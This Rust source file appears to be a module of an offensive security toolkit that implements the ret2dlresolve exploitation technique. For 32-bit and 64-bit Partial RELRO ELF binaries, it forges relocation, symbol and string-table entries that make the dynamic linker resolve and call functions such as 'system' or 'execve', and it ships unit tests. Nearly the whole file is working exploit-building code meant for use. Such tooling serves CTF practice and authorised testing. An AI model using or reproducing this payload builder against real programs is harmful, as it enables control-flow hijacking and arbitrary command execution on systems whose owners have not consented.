//! ret2dlresolve -- Exploit technique for Partial RELRO binaries
//!
//! Forges fake ELF structures (_dl_runtime_resolve input) to resolve
//! arbitrary symbols without needing a libc leak.  The dynamic linker
//! is tricked into looking up a symbol name we control (e.g. "system")
//! and calling it with arguments we provide.
//!
//! # How it works
//!
//! 1. Craft a fake `.rel.plt` / `.rela.plt` entry pointing to a fake symbol
//! 2. Craft a fake `.dynsym` entry pointing to a fake string
//! 3. Craft a fake `.dynstr` entry containing the target function name
//! 4. Call `_dl_runtime_resolve` (via PLT[0]) with an index that points to
//!    our fake structures
//! 5. The linker resolves our fake symbol, writes the address to a
//!    controlled location, and calls it
//!
//! This works on Partial RELRO binaries where:
//! - GOT is writable
//! - Lazy binding is enabled (not BIND_NOW)
//! - The PLT resolver stub is still active
//!
//! # Usage
//!
//! ```rust,no_run
//! use redblue::modules::binary::{Binary, Ret2dlresolve32};
//!
//! let binary = Binary::from_file("./vuln32").unwrap();
//! let resolver = Ret2dlresolve32::from_binary(&binary).unwrap();
//!
//! // writable_addr is a writable area (e.g. .bss + offset)
//! let payload = resolver.build_payload(0x0804c100, "system");
//! // payload.data    -> write at writable_addr
//! // payload.plt0    -> jump target
//! // payload.reloc_index -> argument for PLT[0]
//! ```

use super::packing::{p32, p64};
use super::{Architecture, Binary};

// ELF structure sizes
const ELF32_REL_SIZE: usize = 8; // Elf32_Rel: r_offset(4) + r_info(4)
const ELF32_SYM_SIZE: usize = 16; // Elf32_Sym: 16 bytes
const ELF64_RELA_SIZE: usize = 24; // Elf64_Rela: r_offset(8) + r_info(8) + r_addend(8)
const ELF64_SYM_SIZE: usize = 24; // Elf64_Sym: 24 bytes

// Relocation type for JMP_SLOT (same value on both x86 and x86_64)
const R_JMP_SLOT: u32 = 7;

// Symbol info: STB_GLOBAL(1) << 4 | STT_FUNC(2) = 0x12
const STI_GLOBAL_FUNC: u8 = 0x12;

/// Payload produced by a ret2dlresolve builder.
///
/// Contains the forged ELF structures that must be written to a writable
/// memory region, plus the metadata needed to trigger resolution.
#[derive(Debug, Clone)]
pub struct Ret2dlresolvePayload {
  /// The forged data to write at `writable_addr`.
  ///
  /// Layout (32-bit): `[Elf32_Rel | padding | Elf32_Sym | "symbol\0"]`
  /// Layout (64-bit): `[Elf64_Rela | padding | Elf64_Sym | "symbol\0"]`
  pub data: Vec<u8>,

  /// The reloc_index to pass to `_dl_runtime_resolve` (PLT[0] argument).
  ///
  /// For 32-bit this is a byte offset into `.rel.plt`.
  /// For 64-bit this is an entry index into `.rela.plt`.
  pub reloc_index: u64,

  /// The PLT[0] address to jump to (resolver stub).
  pub plt0_addr: u64,

  /// Where the resolved function address will be written by the linker.
  pub resolved_addr_location: u64,

  /// Human-readable description of the forged layout.
  pub description: String,
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Look up a value in the binary's dynamic entries by tag.
fn find_dynamic(binary: &Binary, tag: u64) -> Option<u64> {
  binary
    .dynamic_entries
    .iter()
    .find(|e| e.d_tag == tag)
    .map(|e| e.d_val)
}

/// DT_JMPREL (23) -- base address of `.rel.plt` / `.rela.plt`
const DT_JMPREL: u64 = 23;
/// DT_SYMTAB (6) -- base address of `.dynsym`
const DT_SYMTAB: u64 = 6;
/// DT_STRTAB (5) -- base address of `.dynstr`
const DT_STRTAB: u64 = 5;
/// DT_PLTREL (20) -- reloc type used by PLT (DT_REL=17 or DT_RELA=7)
const DT_PLTREL: u64 = 20;
/// DT_FLAGS (30)
const DT_FLAGS: u64 = 30;
/// DT_FLAGS_1 (0x6ffffffb)
const DT_FLAGS_1: u64 = 0x6ffffffb;
/// DF_BIND_NOW
const DF_BIND_NOW: u64 = 0x8;
/// DF_1_NOW
const DF_1_NOW: u64 = 0x1;

/// Round `val` up to the next multiple of `align`.
fn align_up(val: usize, align: usize) -> usize {
  (val + align - 1) & !(align - 1)
}

/// Check that the binary uses lazy binding (not Full RELRO / BIND_NOW).
fn check_lazy_binding(binary: &Binary) -> Result<(), String> {
  let has_bind_now = binary.dynamic_entries.iter().any(|d| {
    (d.d_tag == DT_FLAGS && (d.d_val & DF_BIND_NOW) != 0)
      || (d.d_tag == DT_FLAGS_1 && (d.d_val & DF_1_NOW) != 0)
  });

  if has_bind_now {
    return Err(
      "binary uses BIND_NOW (Full RELRO); ret2dlresolve requires lazy binding".into(),
    );
  }
  Ok(())
}

/// Locate PLT[0] from the `.plt` section.
fn find_plt0(binary: &Binary) -> Result<u64, String> {
  binary
    .find_section(".plt")
    .map(|s| s.vaddr)
    .ok_or_else(|| ".plt section not found".into())
}

// ---------------------------------------------------------------------------
// 32-bit
// ---------------------------------------------------------------------------

/// ret2dlresolve builder for 32-bit (x86) ELF binaries.
///
/// Forges `Elf32_Rel` + `Elf32_Sym` + dynstr to trick the dynamic linker
/// into resolving an arbitrary symbol.
#[derive(Debug, Clone)]
pub struct Ret2dlresolve32 {
  /// Base address of `.rel.plt` section (from DT_JMPREL)
  rel_plt_addr: u64,
  /// Base address of `.dynsym` section (from DT_SYMTAB)
  dynsym_addr: u64,
  /// Base address of `.dynstr` section (from DT_STRTAB)
  dynstr_addr: u64,
  /// Size of a single `Elf32_Sym` entry (always 16)
  sym_entry_size: usize,
  /// Address of PLT[0] resolver stub
  plt0_addr: u64,
}

impl Ret2dlresolve32 {
  /// Build a resolver from a parsed 32-bit ELF binary.
  ///
  /// Extracts the addresses of `.rel.plt`, `.dynsym`, `.dynstr` and the
  /// PLT[0] stub from the dynamic section.
  ///
  /// # Errors
  ///
  /// Returns `Err` if:
  /// - The binary is not 32-bit x86
  /// - Required dynamic entries are missing
  /// - The binary uses Full RELRO / BIND_NOW
  pub fn from_binary(binary: &Binary) -> Result<Self, String> {
    if binary.bits != 32 {
      return Err(format!(
        "expected 32-bit binary, got {}-bit",
        binary.bits
      ));
    }
    if binary.arch != Architecture::X86 {
      return Err(format!(
        "expected x86 architecture, got {}",
        binary.arch
      ));
    }

    check_lazy_binding(binary)?;

    let rel_plt_addr = find_dynamic(binary, DT_JMPREL)
      .ok_or("DT_JMPREL not found in dynamic section")?;

    let dynsym_addr = find_dynamic(binary, DT_SYMTAB)
      .ok_or("DT_SYMTAB not found in dynamic section")?;

    let dynstr_addr = find_dynamic(binary, DT_STRTAB)
      .ok_or("DT_STRTAB not found in dynamic section")?;

    let plt0_addr = find_plt0(binary)?;

    Ok(Self {
      rel_plt_addr,
      dynsym_addr,
      dynstr_addr,
      sym_entry_size: ELF32_SYM_SIZE,
      plt0_addr,
    })
  }

  /// Forge the fake ELF structures for resolving `target_symbol`.
  ///
  /// `writable_addr` must point to a writable memory region large enough
  /// to hold the forged payload (typically `.bss` + some offset).
  ///
  /// # Layout at `writable_addr`
  ///
  /// ```text
  /// +0x00  Elf32_Rel   (8 bytes)
  /// +0x08  padding     (to align Elf32_Sym to 16 bytes relative to .dynsym)
  /// +pad   Elf32_Sym   (16 bytes)
  /// +sym   "system\0"  (symbol string, null-terminated)
  /// ```
  pub fn build_payload(
    &self,
    writable_addr: u64,
    target_symbol: &str,
  ) -> Ret2dlresolvePayload {
    let mut data: Vec<u8> = Vec::new();

    // -- Step 1: Reserve space for Elf32_Rel (we'll fill it after alignment) --
    let fake_rel_addr = writable_addr;
    // Placeholder -- will be overwritten below
    data.extend_from_slice(&[0u8; ELF32_REL_SIZE]);

    // reloc_index = byte offset from .rel.plt base to our fake Elf32_Rel
    let reloc_index = fake_rel_addr - self.rel_plt_addr;

    // -- Step 2: Align for Elf32_Sym --
    // The dynamic linker indexes .dynsym as: &dynsym[sym_index * 16]
    // So fake_sym_addr must satisfy:
    //   (fake_sym_addr - dynsym_addr) % 16 == 0
    let unaligned_sym_offset = data.len() as u64;
    let unaligned_sym_addr = writable_addr + unaligned_sym_offset;

    // How many bytes of padding needed to align to dynsym's 16-byte grid
    let misalign =
      (unaligned_sym_addr.wrapping_sub(self.dynsym_addr)) as usize % self.sym_entry_size;
    let pad = if misalign == 0 {
      0
    } else {
      self.sym_entry_size - misalign
    };
    data.extend(std::iter::repeat(0u8).take(pad));

    let fake_sym_addr = writable_addr + data.len() as u64;
    let sym_index =
      (fake_sym_addr - self.dynsym_addr) / self.sym_entry_size as u64;

    // -- Step 3: Build Elf32_Sym --
    // st_name will be filled after we know the string offset
    let sym_offset_in_data = data.len();
    // Elf32_Sym: st_name(4) + st_value(4) + st_size(4) + st_info(1) + st_other(1) + st_shndx(2)
    data.extend_from_slice(&[0u8; ELF32_SYM_SIZE]);

    // -- Step 4: Place the target symbol string --
    let fake_str_addr = writable_addr + data.len() as u64;
    data.extend_from_slice(target_symbol.as_bytes());
    data.push(0); // null terminator

    // st_name = offset from .dynstr base to our fake string
    let st_name = (fake_str_addr - self.dynstr_addr) as u32;

    // -- Step 5: Fill in the Elf32_Sym --
    let sym_bytes = {
      let mut s = Vec::with_capacity(ELF32_SYM_SIZE);
      s.extend_from_slice(&p32(st_name));   // st_name
      s.extend_from_slice(&p32(0));         // st_value
      s.extend_from_slice(&p32(0));         // st_size
      s.push(STI_GLOBAL_FUNC);             // st_info  (STB_GLOBAL | STT_FUNC)
      s.push(0);                            // st_other
      s.extend_from_slice(&[0u8; 2]);       // st_shndx = SHN_UNDEF
      s
    };
    data[sym_offset_in_data..sym_offset_in_data + ELF32_SYM_SIZE]
      .copy_from_slice(&sym_bytes);

    // -- Step 6: Fill in the Elf32_Rel --
    // r_info = (sym_index << 8) | R_386_JMP_SLOT
    let r_info = ((sym_index as u32) << 8) | R_JMP_SLOT;
    // r_offset: writable address where the linker will store the resolved addr.
    // We use writable_addr + total payload size (right after our structures).
    let resolved_addr_location = writable_addr + data.len() as u64;

    let rel_bytes = {
      let mut r = Vec::with_capacity(ELF32_REL_SIZE);
      r.extend_from_slice(&p32(resolved_addr_location as u32)); // r_offset
      r.extend_from_slice(&p32(r_info));                        // r_info
      r
    };
    data[0..ELF32_REL_SIZE].copy_from_slice(&rel_bytes);

    let description = format!(
      "ret2dlresolve (32-bit) for \"{target_symbol}\"\n\
       ├── writable_addr : 0x{writable_addr:08x}\n\
       ├── fake Elf32_Rel: 0x{fake_rel_addr:08x} (reloc_index = {reloc_index})\n\
       │   ├── r_offset  : 0x{resolved_addr_location:08x}\n\
       │   └── r_info    : 0x{r_info:08x} (sym_index={sym_index})\n\
       ├── fake Elf32_Sym: 0x{fake_sym_addr:08x}\n\
       │   └── st_name   : 0x{st_name:08x} (offset into dynstr)\n\
       ├── fake dynstr   : 0x{fake_str_addr:08x} \"{target_symbol}\\0\"\n\
       ├── PLT[0]        : 0x{plt0:08x}\n\
       └── payload size  : {size} bytes",
      plt0 = self.plt0_addr,
      size = data.len(),
    );

    Ret2dlresolvePayload {
      data,
      reloc_index,
      plt0_addr: self.plt0_addr,
      resolved_addr_location,
      description,
    }
  }

  /// Convenience: return the PLT[0] address.
  pub fn plt0(&self) -> u64 {
    self.plt0_addr
  }

  /// Convenience: return the `.rel.plt` base address.
  pub fn rel_plt(&self) -> u64 {
    self.rel_plt_addr
  }

  /// Convenience: return the `.dynsym` base address.
  pub fn dynsym(&self) -> u64 {
    self.dynsym_addr
  }

  /// Convenience: return the `.dynstr` base address.
  pub fn dynstr(&self) -> u64 {
    self.dynstr_addr
  }
}

// ---------------------------------------------------------------------------
// 64-bit
// ---------------------------------------------------------------------------

/// ret2dlresolve builder for 64-bit (x86_64) ELF binaries.
///
/// Forges `Elf64_Rela` + `Elf64_Sym` + dynstr to trick the dynamic linker
/// into resolving an arbitrary symbol.
///
/// Note: on x86_64 the reloc_index passed to the resolver is an *entry index*
/// (not a byte offset), so `reloc_index = (fake_rela_addr - jmprel) / 24`.
#[derive(Debug, Clone)]
pub struct Ret2dlresolve64 {
  /// Base address of `.rela.plt` section (from DT_JMPREL)
  rela_plt_addr: u64,
  /// Base address of `.dynsym` section (from DT_SYMTAB)
  dynsym_addr: u64,
  /// Base address of `.dynstr` section (from DT_STRTAB)
  dynstr_addr: u64,
  /// Size of a single `Elf64_Sym` entry (always 24)
  sym_entry_size: usize,
  /// Address of PLT[0] resolver stub
  plt0_addr: u64,
}

impl Ret2dlresolve64 {
  /// Build a resolver from a parsed 64-bit ELF binary.
  ///
  /// Extracts the addresses of `.rela.plt`, `.dynsym`, `.dynstr` and the
  /// PLT[0] stub from the dynamic section.
  ///
  /// # Errors
  ///
  /// Returns `Err` if:
  /// - The binary is not 64-bit x86_64
  /// - Required dynamic entries are missing
  /// - The binary uses Full RELRO / BIND_NOW
  pub fn from_binary(binary: &Binary) -> Result<Self, String> {
    if binary.bits != 64 {
      return Err(format!(
        "expected 64-bit binary, got {}-bit",
        binary.bits
      ));
    }
    if binary.arch != Architecture::X86_64 {
      return Err(format!(
        "expected x86_64 architecture, got {}",
        binary.arch
      ));
    }

    check_lazy_binding(binary)?;

    let rela_plt_addr = find_dynamic(binary, DT_JMPREL)
      .ok_or("DT_JMPREL not found in dynamic section")?;

    let dynsym_addr = find_dynamic(binary, DT_SYMTAB)
      .ok_or("DT_SYMTAB not found in dynamic section")?;

    let dynstr_addr = find_dynamic(binary, DT_STRTAB)
      .ok_or("DT_STRTAB not found in dynamic section")?;

    let plt0_addr = find_plt0(binary)?;

    Ok(Self {
      rela_plt_addr,
      dynsym_addr,
      dynstr_addr,
      sym_entry_size: ELF64_SYM_SIZE,
      plt0_addr,
    })
  }

  /// Forge the fake ELF structures for resolving `target_symbol`.
  ///
  /// `writable_addr` must point to a writable memory region large enough
  /// to hold the forged payload (typically `.bss` + some offset).
  ///
  /// # Layout at `writable_addr`
  ///
  /// ```text
  /// +0x00  Elf64_Rela  (24 bytes)
  /// +0x18  padding     (to align Elf64_Sym to 24 bytes relative to .dynsym)
  /// +pad   Elf64_Sym   (24 bytes)
  /// +sym   "system\0"  (symbol string, null-terminated)
  /// ```
  pub fn build_payload(
    &self,
    writable_addr: u64,
    target_symbol: &str,
  ) -> Ret2dlresolvePayload {
    let mut data: Vec<u8> = Vec::new();

    // -- Step 1: Reserve space for Elf64_Rela (filled later) --
    let fake_rela_addr = writable_addr;
    data.extend_from_slice(&[0u8; ELF64_RELA_SIZE]);

    // On x86_64 the PLT stub passes an *index* (not byte offset)
    let reloc_index =
      (fake_rela_addr - self.rela_plt_addr) / ELF64_RELA_SIZE as u64;

    // -- Step 2: Align for Elf64_Sym --
    // The dynamic linker indexes .dynsym as: &dynsym[sym_index * 24]
    // So fake_sym_addr must satisfy:
    //   (fake_sym_addr - dynsym_addr) % 24 == 0
    let unaligned_sym_offset = data.len() as u64;
    let unaligned_sym_addr = writable_addr + unaligned_sym_offset;

    let misalign =
      (unaligned_sym_addr.wrapping_sub(self.dynsym_addr)) as usize % self.sym_entry_size;
    let pad = if misalign == 0 {
      0
    } else {
      self.sym_entry_size - misalign
    };
    data.extend(std::iter::repeat(0u8).take(pad));

    let fake_sym_addr = writable_addr + data.len() as u64;
    let sym_index =
      (fake_sym_addr - self.dynsym_addr) / self.sym_entry_size as u64;

    // -- Step 3: Build Elf64_Sym --
    let sym_offset_in_data = data.len();
    // Elf64_Sym: st_name(4) + st_info(1) + st_other(1) + st_shndx(2)
    //          + st_value(8) + st_size(8) = 24 bytes
    data.extend_from_slice(&[0u8; ELF64_SYM_SIZE]);

    // -- Step 4: Place the target symbol string --
    let fake_str_addr = writable_addr + data.len() as u64;
    data.extend_from_slice(target_symbol.as_bytes());
    data.push(0); // null terminator

    // st_name = offset from .dynstr base to our fake string
    let st_name = (fake_str_addr - self.dynstr_addr) as u32;

    // -- Step 5: Fill in the Elf64_Sym --
    let sym_bytes = {
      let mut s = Vec::with_capacity(ELF64_SYM_SIZE);
      s.extend_from_slice(&p32(st_name));   // st_name  (4)
      s.push(STI_GLOBAL_FUNC);             // st_info  (1)
      s.push(0);                            // st_other (1)
      s.extend_from_slice(&[0u8; 2]);       // st_shndx (2) = SHN_UNDEF
      s.extend_from_slice(&p64(0));         // st_value (8)
      s.extend_from_slice(&p64(0));         // st_size  (8)
      s
    };
    data[sym_offset_in_data..sym_offset_in_data + ELF64_SYM_SIZE]
      .copy_from_slice(&sym_bytes);

    // -- Step 6: Fill in the Elf64_Rela --
    // r_info = (sym_index << 32) | R_X86_64_JUMP_SLOT(7)
    let r_info = ((sym_index as u64) << 32) | R_JMP_SLOT as u64;
    // r_offset: writable address where the resolved addr will be stored
    let resolved_addr_location = writable_addr + data.len() as u64;

    let rela_bytes = {
      let mut r = Vec::with_capacity(ELF64_RELA_SIZE);
      r.extend_from_slice(&p64(resolved_addr_location)); // r_offset  (8)
      r.extend_from_slice(&p64(r_info));                  // r_info    (8)
      r.extend_from_slice(&p64(0));                       // r_addend  (8)
      r
    };
    data[0..ELF64_RELA_SIZE].copy_from_slice(&rela_bytes);

    let description = format!(
      "ret2dlresolve (64-bit) for \"{target_symbol}\"\n\
       ├── writable_addr  : 0x{writable_addr:016x}\n\
       ├── fake Elf64_Rela: 0x{fake_rela_addr:016x} (reloc_index = {reloc_index})\n\
       │   ├── r_offset   : 0x{resolved_addr_location:016x}\n\
       │   ├── r_info     : 0x{r_info:016x} (sym_index={sym_index})\n\
       │   └── r_addend   : 0x0\n\
       ├── fake Elf64_Sym : 0x{fake_sym_addr:016x}\n\
       │   └── st_name    : 0x{st_name:08x} (offset into dynstr)\n\
       ├── fake dynstr    : 0x{fake_str_addr:016x} \"{target_symbol}\\0\"\n\
       ├── PLT[0]         : 0x{plt0:016x}\n\
       └── payload size   : {size} bytes",
      plt0 = self.plt0_addr,
      size = data.len(),
    );

    Ret2dlresolvePayload {
      data,
      reloc_index,
      plt0_addr: self.plt0_addr,
      resolved_addr_location,
      description,
    }
  }

  /// Convenience: return the PLT[0] address.
  pub fn plt0(&self) -> u64 {
    self.plt0_addr
  }

  /// Convenience: return the `.rela.plt` base address.
  pub fn rela_plt(&self) -> u64 {
    self.rela_plt_addr
  }

  /// Convenience: return the `.dynsym` base address.
  pub fn dynsym(&self) -> u64 {
    self.dynsym_addr
  }

  /// Convenience: return the `.dynstr` base address.
  pub fn dynstr(&self) -> u64 {
    self.dynstr_addr
  }
}

// ---------------------------------------------------------------------------
// Display
// ---------------------------------------------------------------------------

impl std::fmt::Display for Ret2dlresolvePayload {
  fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
    write!(f, "{}", self.description)
  }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_align_up() {
    assert_eq!(align_up(0, 16), 0);
    assert_eq!(align_up(1, 16), 16);
    assert_eq!(align_up(15, 16), 16);
    assert_eq!(align_up(16, 16), 16);
    assert_eq!(align_up(17, 16), 32);
    assert_eq!(align_up(24, 24), 24);
    assert_eq!(align_up(25, 24), 48);
  }

  #[test]
  fn test_elf32_rel_layout() {
    // Verify that the hand-packed Elf32_Rel has the expected size
    let r_offset: u32 = 0x0804c000;
    let r_info: u32 = (0x10 << 8) | 7;

    let mut rel = Vec::new();
    rel.extend_from_slice(&p32(r_offset));
    rel.extend_from_slice(&p32(r_info));
    assert_eq!(rel.len(), ELF32_REL_SIZE);

    // Verify little-endian encoding
    assert_eq!(rel[0], 0x00);
    assert_eq!(rel[1], 0xc0);
    assert_eq!(rel[2], 0x04);
    assert_eq!(rel[3], 0x08);
  }

  #[test]
  fn test_elf32_sym_layout() {
    let mut sym = Vec::new();
    let st_name: u32 = 0x100;
    sym.extend_from_slice(&p32(st_name));   // st_name
    sym.extend_from_slice(&p32(0));         // st_value
    sym.extend_from_slice(&p32(0));         // st_size
    sym.push(STI_GLOBAL_FUNC);             // st_info
    sym.push(0);                            // st_other
    sym.extend_from_slice(&[0u8; 2]);       // st_shndx
    assert_eq!(sym.len(), ELF32_SYM_SIZE);
    assert_eq!(sym[12], 0x12); // STB_GLOBAL | STT_FUNC
  }

  #[test]
  fn test_elf64_rela_layout() {
    let r_offset: u64 = 0x00601000;
    let sym_index: u64 = 0x20;
    let r_info: u64 = (sym_index << 32) | 7;

    let mut rela = Vec::new();
    rela.extend_from_slice(&p64(r_offset));
    rela.extend_from_slice(&p64(r_info));
    rela.extend_from_slice(&p64(0)); // r_addend
    assert_eq!(rela.len(), ELF64_RELA_SIZE);
  }

  #[test]
  fn test_elf64_sym_layout() {
    let mut sym = Vec::new();
    let st_name: u32 = 0x200;
    sym.extend_from_slice(&p32(st_name));   // st_name  (4)
    sym.push(STI_GLOBAL_FUNC);             // st_info  (1)
    sym.push(0);                            // st_other (1)
    sym.extend_from_slice(&[0u8; 2]);       // st_shndx (2)
    sym.extend_from_slice(&p64(0));         // st_value (8)
    sym.extend_from_slice(&p64(0));         // st_size  (8)
    assert_eq!(sym.len(), ELF64_SYM_SIZE);
    assert_eq!(sym[4], 0x12); // STB_GLOBAL | STT_FUNC
  }

  #[test]
  fn test_32bit_payload_structure() {
    // Simulate a 32-bit resolver with known addresses
    let resolver = Ret2dlresolve32 {
      rel_plt_addr: 0x08048300,
      dynsym_addr: 0x080481d0,
      dynstr_addr: 0x08048270,
      sym_entry_size: ELF32_SYM_SIZE,
      plt0_addr: 0x08048290,
    };

    let writable = 0x0804c100_u64;
    let payload = resolver.build_payload(writable, "system");

    // Verify basic invariants
    assert!(!payload.data.is_empty());
    assert_eq!(payload.plt0_addr, 0x08048290);

    // reloc_index = fake_rel_addr - rel_plt_addr
    assert_eq!(payload.reloc_index, writable - resolver.rel_plt_addr);

    // The data must contain the string "system\0"
    let sys_bytes = b"system\0";
    let found = payload
      .data
      .windows(sys_bytes.len())
      .any(|w| w == sys_bytes);
    assert!(found, "payload must contain target symbol string");

    // resolved_addr_location should be right after the payload data
    assert_eq!(
      payload.resolved_addr_location,
      writable + payload.data.len() as u64
    );
  }

  #[test]
  fn test_64bit_payload_structure() {
    // Simulate a 64-bit resolver with known addresses
    let resolver = Ret2dlresolve64 {
      rela_plt_addr: 0x00400400,
      dynsym_addr: 0x00400200,
      dynstr_addr: 0x00400300,
      sym_entry_size: ELF64_SYM_SIZE,
      plt0_addr: 0x00400500,
    };

    let writable = 0x00601100_u64;
    let payload = resolver.build_payload(writable, "system");

    // Verify basic invariants
    assert!(!payload.data.is_empty());
    assert_eq!(payload.plt0_addr, 0x00400500);

    // reloc_index = (fake_rela_addr - rela_plt_addr) / 24
    let expected_index =
      (writable - resolver.rela_plt_addr) / ELF64_RELA_SIZE as u64;
    assert_eq!(payload.reloc_index, expected_index);

    // The data must contain the string "system\0"
    let sys_bytes = b"system\0";
    let found = payload
      .data
      .windows(sys_bytes.len())
      .any(|w| w == sys_bytes);
    assert!(found, "payload must contain target symbol string");

    // resolved_addr_location should be right after the payload data
    assert_eq!(
      payload.resolved_addr_location,
      writable + payload.data.len() as u64
    );
  }

  #[test]
  fn test_sym_alignment_32() {
    // Verify the Elf32_Sym is always aligned to 16 bytes relative to dynsym_addr
    let resolver = Ret2dlresolve32 {
      rel_plt_addr: 0x08048300,
      dynsym_addr: 0x080481d0,
      dynstr_addr: 0x08048270,
      sym_entry_size: ELF32_SYM_SIZE,
      plt0_addr: 0x08048290,
    };

    // Test with several writable addresses
    for offset in 0..32 {
      let writable = 0x0804c100_u64 + offset;
      let payload = resolver.build_payload(writable, "execve");

      // Find where the Elf32_Sym starts (after Elf32_Rel + padding)
      // The sym starts after the rel entry + alignment padding
      // We can verify by checking that the sym index is integral
      let fake_rel_addr = writable;
      let _reloc_index = fake_rel_addr - resolver.rel_plt_addr;

      // The payload data starts at writable, the sym is somewhere after
      // offset 8 (Elf32_Rel size).  Verify sym_index is exact.
      // If alignment is wrong, sym_index * 16 + dynsym_addr != fake_sym_addr
      // and the payload description would have a non-integer sym_index
      // (but since we use integer division, we verify via modular arithmetic).

      // Extract fake_sym_addr from the r_info in the packed Elf32_Rel
      let r_info_bytes = &payload.data[4..8];
      let r_info = u32::from_le_bytes([
        r_info_bytes[0],
        r_info_bytes[1],
        r_info_bytes[2],
        r_info_bytes[3],
      ]);
      let sym_index = r_info >> 8;
      let rel_type = r_info & 0xff;
      assert_eq!(rel_type, R_JMP_SLOT);

      // Verify the sym is at an aligned location
      let computed_sym_addr =
        resolver.dynsym_addr + (sym_index as u64) * ELF32_SYM_SIZE as u64;
      let actual_sym_addr = writable + ELF32_REL_SIZE as u64
        + {
          let unaligned = writable + ELF32_REL_SIZE as u64;
          let mis = (unaligned.wrapping_sub(resolver.dynsym_addr)) as usize
            % ELF32_SYM_SIZE;
          (if mis == 0 { 0 } else { ELF32_SYM_SIZE - mis }) as u64
        };
      assert_eq!(
        computed_sym_addr, actual_sym_addr,
        "sym alignment mismatch at writable offset {offset}"
      );
    }
  }

  #[test]
  fn test_sym_alignment_64() {
    let resolver = Ret2dlresolve64 {
      rela_plt_addr: 0x00400400,
      dynsym_addr: 0x00400200,
      dynstr_addr: 0x00400300,
      sym_entry_size: ELF64_SYM_SIZE,
      plt0_addr: 0x00400500,
    };

    for offset in 0..48 {
      let writable = 0x00601100_u64 + offset;
      let payload = resolver.build_payload(writable, "execve");

      // Extract sym_index from r_info in the packed Elf64_Rela
      let r_info_bytes = &payload.data[8..16];
      let r_info = u64::from_le_bytes([
        r_info_bytes[0],
        r_info_bytes[1],
        r_info_bytes[2],
        r_info_bytes[3],
        r_info_bytes[4],
        r_info_bytes[5],
        r_info_bytes[6],
        r_info_bytes[7],
      ]);
      let sym_index = r_info >> 32;
      let rel_type = (r_info & 0xffffffff) as u32;
      assert_eq!(rel_type, R_JMP_SLOT);

      let computed_sym_addr =
        resolver.dynsym_addr + sym_index * ELF64_SYM_SIZE as u64;
      let actual_sym_addr = writable + ELF64_RELA_SIZE as u64
        + {
          let unaligned = writable + ELF64_RELA_SIZE as u64;
          let mis = (unaligned.wrapping_sub(resolver.dynsym_addr)) as usize
            % ELF64_SYM_SIZE;
          (if mis == 0 { 0 } else { ELF64_SYM_SIZE - mis }) as u64
        };
      assert_eq!(
        computed_sym_addr, actual_sym_addr,
        "sym alignment mismatch at writable offset {offset}"
      );
    }
  }

  #[test]
  fn test_payload_display() {
    let resolver = Ret2dlresolve32 {
      rel_plt_addr: 0x08048300,
      dynsym_addr: 0x080481d0,
      dynstr_addr: 0x08048270,
      sym_entry_size: ELF32_SYM_SIZE,
      plt0_addr: 0x08048290,
    };
    let payload = resolver.build_payload(0x0804c100, "system");
    let display = format!("{}", payload);
    assert!(display.contains("ret2dlresolve"));
    assert!(display.contains("system"));
    assert!(display.contains("PLT[0]"));
  }
}
